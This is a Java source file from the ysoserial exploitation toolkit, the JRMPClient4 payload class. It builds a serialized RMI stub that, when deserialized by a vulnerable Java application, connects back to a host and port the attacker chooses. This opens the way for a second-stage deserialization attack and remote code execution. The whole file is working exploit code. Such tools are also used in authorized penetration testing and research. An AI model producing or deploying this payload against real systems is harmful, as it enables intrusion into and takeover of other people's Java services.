package ysoserial.payloads;

import java.rmi.server.ObjID;
import java.util.Random;

import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;
import ysoserial.payloads.util.PayloadRunner;
import com.sun.jndi.rmi.registry.ReferenceWrapper_Stub;

public class JRMPClient4 extends PayloadRunner implements ObjectPayload<Object> {

    public Object getObject (final String command ) throws Exception {
        String host;
        int port;
        int sep = command.indexOf(':');
        if (sep < 0) {
            port = new Random().nextInt(65535);
            host = command;
        }
        else {
            host = command.substring(0, sep);
            port = Integer.valueOf(command.substring(sep + 1));
        }
        ObjID objID = new ObjID(new Random().nextInt());
        TCPEndpoint tcpEndpoint = new TCPEndpoint(host, port);
        UnicastRef ref = new UnicastRef(new LiveRef(objID, tcpEndpoint, false));
        ReferenceWrapper_Stub stub = new ReferenceWrapper_Stub(ref);
        return stub;
    }


    public static void main ( final String[] args ) throws Exception {
        Thread.currentThread().setContextClassLoader(JRMPClient4.class.getClassLoader());
        PayloadRunner.run(JRMPClient4.class, args);
    }
}
